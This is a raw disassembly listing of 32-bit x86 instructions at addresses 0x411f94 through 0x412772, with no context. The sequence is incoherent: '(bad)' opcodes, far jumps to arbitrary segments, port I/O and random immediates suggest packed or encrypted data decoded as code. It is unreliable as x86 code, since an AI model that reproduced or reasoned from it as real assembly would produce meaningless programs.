  411f94:	add    dh,0xb5
  411f97:	add    bl,BYTE PTR [esi]
  411f99:	popa   
  411f9a:	not    DWORD PTR [edi-0x66cf266b]
  411fa0:	jae    0x411f38
  411fa2:	pop    ebx
  411fa3:	call   0x29f1:0xeb417608
  411faa:	xchg   BYTE PTR [ebp+0x3e0984f],dl
  411fb0:	mov    ah,dl
  411fb2:	inc    ebx
  411fb3:	add    eax,0x569b537e
  411fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb9:	xchg   edi,eax
  411fba:	xchg   edi,eax
  411fbb:	(bad)  
  411fbd:	lods   eax,DWORD PTR ds:[esi]
  411fbe:	mov    ss,WORD PTR [esi]
  411fc0:	outs   dx,BYTE PTR ds:[esi]
  411fc1:	push   edi
  411fc2:	xor    BYTE PTR [edi-0x5107c49f],bl
  411fc8:	(bad)  
  411fca:	push   ss
  411fcb:	mov    ds,ebp
  411fcd:	repz scas eax,DWORD PTR es:[edi]
  411fcf:	inc    ebp
  411fd0:	fldenv [ecx-0xf]
  411fd3:	add    eax,0xf9d7b4cb
  411fd8:	(bad)  
  411fd9:	inc    esp
  411fda:	retf   0xa568
  411fdd:	ret    0x85d3
  411fe0:	xchg   edi,eax
  411fe1:	icebp  
  411fe2:	mov    esp,0x6046039b
  411fe7:	mov    WORD PTR [edi],es
  411fe9:	ds jo  0x411fc6
  411fec:	cdq    
  411fed:	xchg   eax,esi
  411fef:	jle    0x412052
  411ff1:	sub    ecx,ecx
  411ff3:	inc    edi
  411ff4:	mov    cl,0xb2
  411ff6:	shl    BYTE PTR [ebx],1
  411ff8:	into   
  411ff9:	add    eax,0xe9125663
  411ffe:	hlt    
  411fff:	popf   
  412000:	ins    DWORD PTR es:[edi],dx
  412001:	mov    ds:0x4c518d41,eax
  412006:	lods   al,BYTE PTR ds:[esi]
  412007:	out    dx,al
  412008:	shr    BYTE PTR [esi+0x2a],cl
  41200b:	aaa    
  41200c:	inc    ecx
  41200d:	fwait
  41200e:	(bad)  
  41200f:	out    dx,al
  412010:	adc    dl,bl
  412012:	data16 daa 
  412014:	cmp    eax,0x285fcb0a
  412019:	and    eax,0xa917cc53
  41201e:	pop    es
  41201f:	add    BYTE PTR [eax],ch
  412021:	fisttp DWORD PTR [esi]
  412023:	dec    esi
  412024:	loop   0x411ff8
  412026:	in     eax,0x12
  412028:	push   ebp
  412029:	xchg   edx,eax
  41202a:	sbb    esp,edx
  41202c:	imul   ebp,DWORD PTR [ecx+0x34],0xdc33f375
  412033:	push   edi
  412034:	cmc    
  412035:	or     esp,DWORD PTR [esi+0x25af4006]
  41203b:	mov    WORD PTR [esi+0x58],?
  41203e:	(bad)  
  41203f:	or     dh,BYTE PTR [ebx]
  412041:	imul   esi,DWORD PTR [edx+esi*8+0x384bacd1],0xc14b310
  41204c:	rcl    BYTE PTR fs:[esi+0x19],1
  412050:	nop
  412051:	mov    ebx,DWORD PTR [ebp-0x4b]
  412054:	sahf   
  412055:	fs jl  0x41203d
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	mov    esi,0xfaec1d81
  41205e:	sbb    al,0x48
  412060:	imul   eax,DWORD PTR [ebx+0x6b],0xffffff84
  412064:	mov    al,0x8d
  412066:	jg     0x41209a
  412068:	or     DWORD PTR [edi-0x50378993],ebp
  41206e:	push   eax
  41206f:	xchg   DWORD PTR [ecx+0x5d294e56],ebp
  412075:	arpl   WORD PTR [esi+ebp*4+0x4febeb03],bp
  41207c:	dec    ebx
  41207d:	inc    ecx
  41207e:	and    eax,0xf687b3ba
  412083:	sbb    BYTE PTR [esi-0x270fa5a0],ch
  412089:	fdiv   QWORD PTR [ebp+0xf]
  41208c:	push   edx
  41208d:	or     dh,BYTE PTR [edx]
  41208f:	shl    DWORD PTR [ebp-0x47],cl
  412092:	es loop 0x412062
  412095:	sbb    al,0x43
  412097:	rcr    BYTE PTR ds:0x879a9d45,cl
  41209d:	lods   ax,WORD PTR ds:[esi]
  41209f:	add    al,0x9c
  4120a1:	adc    eax,0xcc2e6bec
  4120a6:	shl    BYTE PTR [ecx+0x5892099a],cl
  4120ac:	out    dx,eax
  4120ad:	outs   dx,DWORD PTR ds:[esi]
  4120ae:	sub    BYTE PTR [ecx+0x65],dl
  4120b1:	cdq    
  4120b2:	stc    
  4120b3:	jg     0x41208d
  4120b5:	enter  0x9f0b,0xb8
  4120b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ba:	add    al,0x9
  4120bc:	pop    ecx
  4120bd:	sub    esp,DWORD PTR [ecx+0x53]
  4120c0:	pop    esi
  4120c1:	aaa    
  4120c2:	les    ebp,FWORD PTR [edx]
  4120c4:	pop    ebp
  4120c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120c6:	jge    0x412064
  4120c8:	int    0x90
  4120ca:	int    0xd6
  4120cc:	pop    ebp
  4120cd:	sub    cl,bh
  4120cf:	dec    esp
  4120d0:	sbb    ah,BYTE PTR [esp+edx*1]
  4120d3:	cdq    
  4120d4:	lea    edi,[ecx-0x70]
  4120d7:	in     al,0xa4
  4120d9:	pop    eax
  4120da:	pop    edx
  4120db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120dc:	inc    edi
  4120dd:	jmp    0x4120a8
  4120df:	push   ds
  4120e0:	cmp    DWORD PTR [esi-0x19236901],esp
  4120e6:	dec    esi
  4120e7:	enter  0x1ebd,0x2e
  4120eb:	jnp    0x412091
  4120ed:	(bad)  
  4120ee:	es mov bl,0x64
  4120f1:	dec    ecx
  4120f2:	js     0x412101
  4120f4:	retf   
  4120f5:	mov    ecx,0xdaa8df05
  4120fa:	fimul  WORD PTR [edx+edx*1]
  4120fd:	fstp   DWORD PTR [ecx+ecx*2]
  412100:	fistp  QWORD PTR [edi]
  412102:	mov    ecx,cs
  412104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412105:	cli    
  412106:	cmp    DWORD PTR [eax-0x1ef35bff],0x548b6c48
  412110:	sbb    ecx,ebx
  412112:	mov    ebp,esp
  412114:	call   0xe49f3968
  412119:	inc    edi
  41211a:	add    BYTE PTR [ecx+0x77],dl
  41211d:	fwait
  41211e:	into   
  41211f:	push   0x47
  412121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412122:	in     eax,0xa6
  412124:	mov    ebx,0x81e94bb4
  412129:	mov    eax,ds:0xa3461a1a
  41212e:	mov    dl,BYTE PTR [ecx]
  412130:	mov    esi,0x469d3302
  412135:	pop    edi
  412136:	inc    ecx
  412137:	inc    esi
  412138:	jecxz  0x412153
  41213a:	jne    0x4120e5
  41213c:	dec    esp
  41213d:	inc    ecx
  41213e:	xor    al,0x45
  412140:	ss in  eax,dx
  412142:	jmp    0xf018:0x12aa28dd
  412149:	mov    ch,0x6f
  41214b:	mov    esi,0x2fc25c76
  412150:	or     ebp,ebx
  412152:	pusha  
  412153:	ficom  DWORD PTR [esi]
  412155:	sbb    ch,BYTE PTR [edi-0x68]
  412158:	xchg   ecx,eax
  412159:	sbb    dh,dh
  41215b:	cdq    
  41215c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41215d:	fwait
  41215e:	and    dh,BYTE PTR ds:0xd5557533
  412164:	add    BYTE PTR ds:[ebp+0xa],0x2e
  412169:	rcr    BYTE PTR [ebp-0x19],1
  41216c:	adc    ecx,ebx
  41216e:	jne    0x4121c4
  412170:	ret    0x2d9d
  412173:	push   edx
  412174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412176:	jg     0x4121c5
  412178:	mov    al,ds:0x6bfb7138
  41217d:	jecxz  0x41218e
  41217f:	repnz cmp eax,0x5171ed1
  412185:	xchg   edi,eax
  412186:	mov    WORD PTR [ecx+esi*1-0x15],ss
  41218a:	mov    edx,0x5febc356
  41218f:	and    al,0xcc
  412191:	xchg   esp,eax
  412192:	retf   
  412193:	pop    edx
  412194:	push   edx
  412195:	xadd   esp,ecx
  412198:	push   0xffffff9e
  41219a:	pop    ecx
  41219b:	pop    edx
  41219c:	(bad)  
  41219d:	lea    ebp,[esi+0x70]
  4121a0:	jns    0x412187
  4121a2:	cmc    
  4121a3:	jmp    0x89627fa7
  4121a8:	or     al,0xec
  4121aa:	xor    ah,BYTE PTR [eax+0x3630f3d7]
  4121b0:	mov    ch,0x39
  4121b2:	xchg   ebp,eax
  4121b3:	sub    ebx,DWORD PTR [esi]
  4121b5:	xor    edx,DWORD PTR [edx]
  4121b7:	push   0x1a
  4121b9:	andps  xmm6,xmm5
  4121bc:	sbb    al,0x43
  4121be:	pop    ebx
  4121bf:	cwde   
  4121c0:	test   cl,cl
  4121c2:	and    ch,al
  4121c4:	jecxz  0x4121fc
  4121c6:	std    
  4121c7:	mov    edi,DWORD PTR [edx]
  4121c9:	or     DWORD PTR gs:[eax-0x22],0xd2cc604f
  4121d1:	shl    BYTE PTR [edx+ecx*4-0x4469b157],1
  4121d8:	js     0x41220c
  4121da:	gs out dx,al
  4121dc:	mov    ebp,0xa033ad3
  4121e1:	ins    BYTE PTR es:[edi],dx
  4121e2:	or     al,0xa
  4121e4:	xchg   edx,eax
  4121e5:	mov    esp,0xc553fdc2
  4121ea:	add    bh,BYTE PTR [ebx-0x28]
  4121ed:	adc    edi,esp
  4121ef:	es retf 
  4121f1:	pop    ds
  4121f2:	ror    DWORD PTR [edi],cl
  4121f4:	mov    ebx,0x43f4b4a8
  4121f9:	out    0xfa,eax
  4121fb:	cwde   
  4121fc:	stc    
  4121fd:	mov    ah,ah
  4121ff:	add    eax,0x57f6a897
  412204:	adc    eax,0xa377d65e
  412209:	fsubr  QWORD PTR [eax-0x7d158911]
  41220f:	fmul   DWORD PTR [edx+ebp*1]
  412212:	adc    bl,bl
  412214:	inc    ebp
  412215:	mov    edi,ebx
  412217:	add    dl,BYTE PTR [edx]
  412219:	mov    eax,eax
  41221b:	xchg   ebx,eax
  41221c:	or     al,0xdf
  41221e:	pusha  
  41221f:	jmp    DWORD PTR [eax-0x74]
  412222:	neg    DWORD PTR [ecx+0x1821bdb2]
  412228:	xor    esi,DWORD PTR [ecx]
  41222a:	scas   al,BYTE PTR es:[edi]
  41222b:	jp     0x4121f8
  41222d:	das    
  41222e:	jbe    0x41223b
  412230:	popf   
  412231:	pop    ss
  412232:	xchg   esp,eax
  412233:	inc    ebp
  412234:	push   esp
  412235:	aad    0x85
  412237:	cld    
  412238:	fild   DWORD PTR [edx+0xc]
  41223b:	lock repz cs gs and edi,eax
  412241:	dec    edi
  412242:	fsubr  DWORD PTR [esi]
  412244:	adc    al,0xc6
  412246:	imul   edi,DWORD PTR [edi+edx*8],0x15adb76a
  41224d:	(bad)  
  412251:	add    esp,eax
  412253:	xor    ah,BYTE PTR [ecx+0x68]
  412256:	jl     0x4121df
  412258:	je     0x412266
  41225a:	mov    eax,0x8443a22c
  41225f:	js     0x41228f
  412261:	or     eax,0x29f04c83
  412266:	in     al,dx
  412267:	cmc    
  412268:	cmp    eax,0x865a8f34
  41226d:	mov    edx,0xb01e55e3
  412272:	inc    edi
  412273:	scas   al,BYTE PTR es:[edi]
  412274:	nop
  412275:	cmp    DWORD PTR [esi+ebx*8-0x300b9f5f],ebp
  41227c:	in     eax,0x9c
  41227e:	mov    al,0x47
  412280:	out    dx,al
  412281:	sbb    ebp,DWORD PTR [edx-0x77]
  412284:	mov    ecx,0x1ace0a9f
  412289:	push   0xffffff80
  41228b:	lods   al,BYTE PTR ds:[esi]
  41228c:	out    0xc7,al
  41228e:	and    BYTE PTR [esi+0x355cf052],ah
  412294:	push   0xffffffd3
  412296:	mov    ebp,0x880b6a5f
  41229b:	pop    eax
  41229c:	out    0x75,eax
  41229e:	rcl    BYTE PTR [esi-0x6cb304ab],1
  4122a4:	sar    BYTE PTR [ecx+ebp*2-0x71],1
  4122a8:	es push eax
  4122aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ab:	sub    edi,0xf80b44c0
  4122b1:	pusha  
  4122b2:	pop    ss
  4122b3:	sar    BYTE PTR [ecx+0x59],1
  4122b6:	jge    0x412255
  4122b8:	mov    ecx,0x119b412c
  4122bd:	or     ah,dh
  4122bf:	cwde   
  4122c0:	and    al,BYTE PTR [edi+0x36]
  4122c3:	dec    eax
  4122c4:	popf   
  4122c5:	dec    edi
  4122c6:	loopne 0x41230d
  4122c8:	mov    bl,0x34
  4122ca:	popf   
  4122cb:	sub    DWORD PTR [edx],esi
  4122cd:	inc    esp
  4122ce:	push   edi
  4122cf:	dec    ebp
  4122d0:	mov    bh,0x8c
  4122d2:	lods   al,BYTE PTR ds:[esi]
  4122d3:	adc    ebx,DWORD PTR [ebp-0x4c]
  4122d6:	retf   
  4122d7:	lds    edi,FWORD PTR gs:[esp+ebx*4]
  4122db:	xor    eax,DWORD PTR [edx+0x20ea38b7]
  4122e1:	icebp  
  4122e2:	cmp    dl,dh
  4122e4:	cmp    eax,0x127e89fb
  4122e9:	and    eax,eax
  4122eb:	pop    edi
  4122ec:	adc    al,0x40
  4122ee:	mov    edx,0xa295b50e
  4122f3:	loopne 0x412309
  4122f5:	jg     0x4122a7
  4122f7:	bound  eax,QWORD PTR [ecx+ebx*8]
  4122fa:	repnz cmp DWORD PTR [edi+edx*8-0x1362d70],edx
  412302:	pop    esp
  412303:	and    al,0x7a
  412305:	add    edx,DWORD PTR [eax+0xe509783]
  41230b:	jge    0x412298
  41230d:	xchg   esi,eax
  41230e:	ror    BYTE PTR [ecx+0x3a],0x77
  412312:	je     0x412329
  412314:	aad    0x18
  412316:	or     edi,edi
  412318:	mov    cl,0xf7
  41231a:	leave  
  41231b:	adc    DWORD PTR [ebp+0x23],esi
  41231e:	das    
  41231f:	sbb    BYTE PTR [esi],bh
  412321:	or     dh,BYTE PTR [eax-0xc]
  412324:	sahf   
  412325:	fnstcw WORD PTR [ebp+edx*8+0x24]
  412329:	push   ecx
  41232a:	shl    DWORD PTR [edi-0x50],0x38
  41232e:	sub    eax,0xde9db36c
  412333:	add    eax,0xcc1e3e7d
  412338:	jg     0x4123a3
  41233a:	das    
  41233b:	retf   
  41233c:	test   eax,0xf134ac2b
  412341:	idiv   BYTE PTR [edi+ebp*1-0x2fb76d56]
  412348:	outs   dx,BYTE PTR ds:[esi]
  412349:	pop    edx
  41234a:	push   es
  41234b:	fdiv   DWORD PTR [ebx+0x34]
  41234e:	shr    BYTE PTR [ebp+eax*8+0x7a],0x3
  412353:	fcmovbe st,st(7)
  412355:	mov    esp,0x947de44e
  41235a:	push   edx
  41235b:	cmp    eax,0x1d1c3c37
  412360:	sbb    dl,0xae
  412363:	adc    ecx,DWORD PTR [edi+esi*4]
  412366:	outs   dx,BYTE PTR ds:[esi]
  412367:	jne    0x4122f9
  412369:	loope  0x41237b
  41236b:	mov    cl,0xf6
  41236d:	adc    dh,BYTE PTR [edi]
  41236f:	popf   
  412370:	out    dx,eax
  412371:	pop    bx
  412373:	lahf   
  412374:	add    esi,esi
  412376:	out    dx,al
  412377:	test   DWORD PTR [ecx],0xcae31e8d
  41237d:	and    al,0xc0
  41237f:	imul   esi,edi,0x45
  412382:	and    DWORD PTR [edx+0xf],0xbfcddcd8
  412389:	sbb    al,0x93
  41238b:	fstp   TBYTE PTR [esi+ecx*8]
  41238e:	push   cs
  41238f:	outs   dx,BYTE PTR ds:[esi]
  412390:	xchg   ecx,eax
  412391:	jp     0x412408
  412393:	repz inc ebp
  412395:	dec    edi
  412396:	int3   
  412397:	inc    ebp
  412398:	mov    dl,0xfd
  41239a:	push   ss
  41239b:	je     0x412419
  41239d:	aam    0xa1
  41239f:	lods   eax,DWORD PTR ds:[esi]
  4123a0:	xchg   ebp,eax
  4123a1:	adc    DWORD PTR ds:0xfb04f6de,edi
  4123a7:	xor    eax,0xf3acaf9b
  4123ac:	ja     0x4123e7
  4123ae:	leave  
  4123af:	pop    ss
  4123b0:	sub    al,BYTE PTR [edx]
  4123b2:	pop    edx
  4123b3:	mov    al,ds:0x2fdc0537
  4123b8:	stos   BYTE PTR es:[edi],al
  4123b9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4123bb:	adc    DWORD PTR [edi+ebx*8+0x4a],eax
  4123bf:	adc    cl,BYTE PTR [edi-0x26]
  4123c2:	dec    esi
  4123c3:	mov    edi,0xbed24d1c
  4123c8:	fst    DWORD PTR [edi-0x2c937543]
  4123ce:	push   0x27627a53
  4123d3:	jmp    0xf4e2:0x46f1a3b7
  4123da:	imul   esi,DWORD PTR [edi+ebx*4-0x32636376],0x61
  4123e2:	cmc    
  4123e3:	push   edi
  4123e4:	mov    ebx,0x20de048d
  4123e9:	dec    ecx
  4123ea:	push   esi
  4123eb:	mov    al,ds:0x69902cf5
  4123f0:	push   DWORD PTR [eax]
  4123f2:	and    al,0x28
  4123f4:	push   eax
  4123f5:	pop    ebp
  4123f6:	jmp    0xa4d8d9f
  4123fb:	inc    eax
  4123fc:	mov    eax,ds:0x16f8308
  412401:	and    eax,0xa52643e6
  412406:	inc    ebp
  412407:	adc    BYTE PTR [ebx+edx*1+0x28c29ce8],0x18
  41240f:	pop    ss
  412410:	fmul   QWORD PTR [ecx-0x51]
  412413:	xchg   DWORD PTR [ecx+0x4ba1eeb1],eax
  412419:	xchg   BYTE PTR [esi+0x6d9403b2],ch
  41241f:	xor    ecx,DWORD PTR [ebx]
  412421:	inc    ecx
  412422:	xor    bl,dl
  412424:	jle    0x412455
  412426:	push   0x745b74d6
  41242b:	adc    eax,0x8db78573
  412430:	xchg   ebx,eax
  412431:	mov    ecx,0x3efaa57d
  412436:	and    BYTE PTR [edx-0x13f9bea8],ch
  41243c:	jl     0x41241c
  41243e:	jno    0x4123c8
  412440:	cwde   
  412441:	adc    eax,eax
  412443:	call   0xc4021277
  412448:	test   al,0xa1
  41244a:	cmp    bl,ch
  41244c:	rol    DWORD PTR [edx+ecx*4],0x76
  412450:	add    ch,BYTE PTR [ecx]
  412452:	jnp    0x412486
  412454:	lea    edi,es:[edx]
  412457:	(bad)  
  412458:	repz stc 
  41245a:	rcl    BYTE PTR [esi+0x67075302],cl
  412460:	fwait
  412461:	inc    ebx
  412462:	out    dx,ax
  412464:	shl    BYTE PTR [ebx-0x5f2195a],0xb5
  41246b:	out    dx,al
  41246c:	pusha  
  41246d:	inc    ebp
  41246e:	and    DWORD PTR [edi],esp
  412470:	mov    dh,0x68
  412472:	cs inc ebp
  412474:	addr16 addr16 push eax
  412477:	fs pop ecx
  412479:	push   cs
  41247a:	fcmove st,st(2)
  41247c:	retf   0x605c
  41247f:	or     esi,DWORD PTR [esi+esi*4]
  412482:	call   0xbc03:0x9e37274c
  412489:	xor    DWORD PTR [edi],esi
  41248b:	inc    BYTE PTR [ecx+0x19751beb]
  412491:	sbb    esp,DWORD PTR ds:0x11ccc187
  412497:	fwait
  412498:	sbb    eax,0xc977b626
  41249d:	cmp    BYTE PTR [ebp+0x2c1e561f],al
  4124a3:	rcr    DWORD PTR [ebx+edi*4+0x55],cl
  4124a7:	and    esp,edi
  4124a9:	xchg   ebp,eax
  4124aa:	sbb    esp,0x1e958a81
  4124b0:	leave  
  4124b1:	sbb    DWORD PTR [ecx],edx
  4124b3:	and    DWORD PTR [edi+0x23bc2aaa],esp
  4124b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124ba:	loope  0x412520
  4124bc:	call   0xe1aad59e
  4124c1:	sbb    eax,0x50642955
  4124c6:	jae    0x412487
  4124c8:	mov    BYTE PTR [eax],ah
  4124ca:	test   ebx,edi
  4124cc:	ret    
  4124cd:	in     al,dx
  4124ce:	jmp    0x13de36df
  4124d3:	les    edi,FWORD PTR [esi]
  4124d5:	out    0x52,al
  4124d7:	or     dl,BYTE PTR [edi+0x28]
  4124da:	mov    ss,WORD PTR [edi-0x598d1c73]
  4124e0:	jle    0x4124e2
  4124e2:	pusha  
  4124e3:	pop    edx
  4124e4:	jge    0x41253d
  4124e6:	dec    ecx
  4124e7:	cs push edx
  4124e9:	es mov ah,0x58
  4124ec:	sub    BYTE PTR [edi-0x2c],0x89
  4124f0:	mov    al,0xac
  4124f2:	mov    edx,0x7cf85160
  4124f7:	sbb    BYTE PTR [esi],ch
  4124f9:	add    ecx,DWORD PTR [edi-0x1e]
  4124fc:	fsubr  DWORD PTR [edi]
  4124fe:	test   BYTE PTR [ebx-0x3e],cl
  412501:	retf   
  412502:	jecxz  0x412503
  412504:	stc    
  412505:	push   es
  412506:	lahf   
  412507:	jge    0x412523
  412509:	xor    DWORD PTR [edx+edx*1],edi
  41250c:	and    dl,BYTE PTR [ebx]
  41250e:	das    
  41250f:	dec    ebx
  412510:	(bad)  
  412511:	fist   DWORD PTR [ebp-0x49]
  412514:	mov    DWORD PTR [ebx],edx
  412516:	xchg   edx,eax
  412517:	loopne 0x412573
  412519:	ror    DWORD PTR [edi-0x20f4d279],cl
  41251f:	or     eax,0xa15f6480
  412524:	test   al,0x95
  412526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412527:	dec    ebp
  412528:	xlat   BYTE PTR ds:[ebx]
  412529:	adc    al,0x3c
  41252b:	or     edi,ebx
  41252d:	scas   al,BYTE PTR es:[edi]
  41252e:	js     0x41253f
  412530:	adc    eax,0x333d668c
  412535:	fwait
  412536:	cmp    BYTE PTR [ebp+esi*4-0x28],dh
  41253a:	mov    al,0x26
  41253c:	mov    BYTE PTR [ebx+0x3e],bh
  41253f:	mov    bh,0xca
  412541:	fcmove st,st(4)
  412543:	not    BYTE PTR [ebx]
  412545:	cmp    BYTE PTR [esi-0x1b38c6ea],ah
  41254b:	ds ds ins DWORD PTR es:[edi],dx
  41254e:	fisub  DWORD PTR [esp+ebx*8-0x38cc97ad]
  412555:	pop    ss
  412556:	mov    ecx,0x4b4b87ff
  41255b:	mov    edx,eax
  41255d:	cs mov edi,0x34b14712
  412563:	test   eax,0x30fbb8f8
  412568:	sahf   
  412569:	out    dx,al
  41256a:	mov    bh,dl
  41256c:	cmp    bh,bh
  41256e:	mov    dh,0x44
  412570:	inc    eax
  412571:	pop    eax
  412572:	aas    
  412573:	into   
  412574:	sar    DWORD PTR [eax],1
  412576:	xor    DWORD PTR [edx+0x44a7032f],0x1d
  41257d:	sar    BYTE PTR [esi-0x142ebd5e],0x22
  412584:	add    ch,BYTE PTR [edx+0x75]
  412587:	jno    0x4125bd
  412589:	ret    
  41258a:	pop    ebp
  41258b:	mov    edi,0xb7c2ab47
  412590:	arpl   WORD PTR [edx],bx
  412592:	pop    ss
  412593:	das    
  412594:	inc    ebx
  412595:	call   DWORD PTR [edi]
  412597:	inc    edx
  412598:	xlat   BYTE PTR ds:[ebx]
  412599:	out    dx,eax
  41259a:	or     eax,0x69522838
  41259f:	xlat   BYTE PTR ds:[ebx]
  4125a0:	aad    0x43
  4125a2:	pop    ds
  4125a3:	test   BYTE PTR [esp+ecx*2+0x75a1b3b3],bh
  4125aa:	pop    ebp
  4125ab:	push   es
  4125ac:	fild   DWORD PTR [ebx+0x61]
  4125af:	mov    es,WORD PTR [ebx+0x2b]
  4125b2:	or     edi,DWORD PTR [edx-0x7f]
  4125b5:	inc    edx
  4125b6:	jecxz  0x41260d
  4125b8:	shl    DWORD PTR [ebx+0x5859c84a],1
  4125be:	cmc    
  4125bf:	cmp    dh,BYTE PTR [ebx]
  4125c1:	pushf  
  4125c2:	stos   BYTE PTR es:[edi],al
  4125c3:	jb     0x4125f9
  4125c5:	pop    esp
  4125c6:	leave  
  4125c7:	xor    esp,DWORD PTR [edx-0x322c4bd9]
  4125cd:	(bad)
  4125d1:	push   es
  4125d2:	pop    ecx
  4125d3:	in     al,dx
  4125d4:	(bad)  [eax]
  4125d6:	fldcw  WORD PTR [esi-0x2dcc5095]
  4125dc:	xor    esp,DWORD PTR [edi-0x2e]
  4125df:	xor    bh,bl
  4125e1:	xchg   edi,eax
  4125e2:	or     bh,ch
  4125e4:	mov    edi,0x46a201ba
  4125e9:	(bad)  
  4125eb:	xchg   ch,bh
  4125ed:	retf   
  4125ee:	out    0x85,eax
  4125f0:	jle    0x4125fc
  4125f2:	adc    al,0x53
  4125f4:	stc    
  4125f5:	sbb    ebx,ecx
  4125f7:	out    dx,eax
  4125f8:	lea    edi,cs:[edi-0xe15bffc]
  4125ff:	out    0x3b,al
  412601:	test   DWORD PTR [ebx],0x3c10a9a9
  412607:	jecxz  0x4125cd
  412609:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41260b:	jg     0x41268b
  41260d:	mov    ecx,fs
  41260f:	std    
  412610:	std    
  412611:	addr16 jne 0x4125c3
  412614:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  412616:	ficom  WORD PTR [ecx+0x62]
  412619:	aas    
  41261a:	and    BYTE PTR [edx],dl
  41261c:	fidivr WORD PTR [edi+esi*1]
  41261f:	sub    al,0x87
  412621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412622:	xor    BYTE PTR [esp+ebp*8-0x60],bl
  412626:	mov    esi,0xaeb77efd
  41262b:	je     0x4125e7
  41262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41262e:	mov    ebp,0x77f71ecd
  412633:	jne    0x41268e
  412635:	sbb    DWORD PTR [edx],ecx
  412637:	or     DWORD PTR [ecx],0xa3664b81
  41263d:	xchg   BYTE PTR [ebx-0x7a],dh
  412640:	dec    eax
  412641:	add    eax,ecx
  412643:	(bad)  
  412644:	loop   0x4125fc
  412646:	xor    BYTE PTR [ecx+0x64],bh
  412649:	xchg   ebx,eax
  41264a:	shl    DWORD PTR [eax],0xea
  41264d:	add    DWORD PTR [edx+edi*2+0x53cf05e7],eax
  412654:	mov    esp,0x35803597
  412659:	cmp    DWORD PTR [ecx-0x71578470],0xffffff8c
  412660:	sub    edx,edi
  412662:	mov    dl,0x4c
  412664:	or     BYTE PTR [ecx],0x85
  412667:	jecxz  0x4126e3
  412669:	cmp    BYTE PTR [ecx-0x59c43e6b],ah
  41266f:	into   
  412670:	dec    ebp
  412671:	cld    
  412672:	popa   
  412673:	jge    0x4126c1
  412675:	mov    eax,0x1a276d93
  41267a:	mov    ebx,0xadc6790d
  41267f:	or     al,0x24
  412681:	cld    
  412682:	xchg   esp,eax
  412683:	push   esi
  412684:	cwde   
  412685:	mov    ebp,0xb3043e3a
  41268a:	mov    ds:0xb5685e0e,al
  41268f:	jmp    0x41267c
  412691:	and    BYTE PTR [ecx+0x46],bl
  412694:	cmc    
  412695:	or     BYTE PTR [ecx],ch
  412697:	frstor [edi-0x1de8dbcc]
  41269d:	iret   
  41269e:	mov    esp,0xcd67b056
  4126a3:	sub    ebp,DWORD PTR [esi+0x2c]
  4126a6:	(bad)  
  4126a9:	clc    
  4126aa:	adc    DWORD PTR [eax-0xf],esi
  4126ad:	loopne 0x4126c5
  4126af:	pusha  
  4126b0:	and    ah,BYTE PTR [edx+0x3b]
  4126b3:	mov    ebx,DWORD PTR [edi]
  4126b5:	scas   eax,DWORD PTR es:[edi]
  4126b6:	enter  0x4c1c,0xc8
  4126ba:	iret   
  4126bb:	ret    
  4126bc:	xchg   BYTE PTR [esi+0x38f5f1d],ah
  4126c2:	test   eax,0x98db1397
  4126c7:	cmp    eax,0xe4cf15b7
  4126cc:	mov    ds:0xa648906d,al
  4126d1:	xchg   ebx,eax
  4126d2:	push   ebx
  4126d3:	ss mov ?,edi
  4126d6:	cmp    eax,0xe698240e
  4126db:	in     al,0x3c
  4126dd:	aad    0xd4
  4126df:	sub    al,0xab
  4126e1:	mov    ds:0x11b49427,al
  4126e6:	mov    bl,0x5c
  4126e8:	ficomp WORD PTR [ebx-0x77729dea]
  4126ee:	inc    edx
  4126ef:	xchg   edx,eax
  4126f0:	outs   dx,BYTE PTR ds:[esi]
  4126f1:	daa    
  4126f2:	mov    bh,bh
  4126f4:	popf   
  4126f5:	adc    eax,0xd850c0c
  4126fa:	ja     0x412723
  4126fc:	or     bl,BYTE PTR [ebx-0x7d9128c3]
  412702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412703:	mov    ecx,0x5dcec70
  412708:	adc    al,ah
  41270a:	cmc    
  41270b:	clc    
  41270c:	pusha  
  41270d:	ret    
  41270e:	pushf  
  41270f:	and    al,0x20
  412711:	jmp    0x9072:0x9935a06a
  412718:	pop    edi
  412719:	push   esp
  41271a:	test   al,0xe4
  41271c:	add    dh,BYTE PTR [edi+0x5f328347]
  412722:	push   ebp
  412723:	inc    esp
  412724:	enter  0xd762,0x59
  412728:	add    ecx,ecx
  41272a:	ror    BYTE PTR [ebx+0x6abe4144],0xa
  412731:	popf   
  412732:	shr    dh,cl
  412734:	clc    
  412735:	pop    ss
  412736:	xor    al,0x5b
  412738:	jae    0x4126bd
  41273a:	stos   BYTE PTR es:[edi],al
  41273b:	test   al,0x7e
  41273d:	mov    BYTE PTR [ecx],dh
  41273f:	leave  
  412740:	int3   
  412741:	std    
  412742:	daa    
  412743:	inc    ebp
  412744:	pop    ebx
  412745:	mov    dh,0x1a
  412747:	cmp    DWORD PTR [eax+0x24],ebx
  41274a:	aaa    
  41274b:	lahf   
  41274c:	dec    ecx
  41274d:	mov    esp,0xae13a797
  412752:	push   edi
  412753:	pop    ss
  412754:	pop    eax
  412755:	mov    ah,0xe1
  412757:	jmp    0x6eee:0xaa9b6cfe
  41275e:	or     ebp,esi
  412760:	bound  esp,QWORD PTR [ebp-0x52]
  412763:	jge    0x4126fb
  412765:	inc    ebx
  412766:	sub    dh,bh
  412768:	sub    esp,edi
  41276a:	in     eax,dx
  41276b:	pop    ss
  41276c:	mov    BYTE PTR [edi-0x26422f36],al
  412772:	xor    al,0x79
